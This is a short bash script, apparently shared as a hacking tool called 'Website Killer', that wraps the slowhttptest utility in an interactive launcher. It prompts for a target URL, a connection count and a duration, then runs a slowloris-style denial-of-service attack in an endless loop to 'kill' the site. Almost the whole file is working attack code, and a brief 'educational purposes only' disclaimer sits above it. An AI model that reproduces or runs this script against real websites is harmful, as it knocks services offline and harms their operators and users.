clear

echo "__        __   _         _ _         _  ___ _ _"          
echo "\ \      / /__| |__  ___(_) |_ ___  | |/ (_) | | ___ _ __" 
echo " \ \ /\ / / _ \ '_ \/ __| | __/ _ \ | ' /| | | |/ _ \ '__|"
echo "  \ V  V /  __/ |_) \__ \ | ||  __/ | . \| | | |  __/ |   "
echo "  \_/\_/ \___|_.__/|___/_|\__\___| |_|\_\_|_|_|\___|_|   "
echo
echo "This is for educational purposes only! I am not responsable for your actions!!"
echo "Created By: 3V3RYW3R3"

echo 

sleep 2

echo Enter the FULL Url of the host:

read url

clear

echo Url = $url

sleep 1

clear

echo Url = $url
echo
echo Set the number of connections to be made, Max is 65539:

read con

clear

echo Url = $url
echo Connections = $con
echo
sleep 1

echo Enter the length of the attack in seconds:

read time

clear

echo Url = $url
echo Connections = $con
echo Time = $time
echo
sleep 1

echo The attack will now begin in a loop, if the site goes offline and then back online, press CONTROL C. If you get crazy lines of error codes, 
echo ya did somthing wrong in the setup

sleep 3
echo
echo This is the code BTW: slowhttptest -c $con -H -l $time -i 10 -r 200 -t GET -u $url -x 24 -p 3
echo
echo Press enter to kill this site!

read start

clear

echo See ya later aligator!

sleep 1

clear

while :
do
slowhttptest -c $con -H -l $time -i 10 -r 200 -t GET -u $url -x 24 -p 3
done
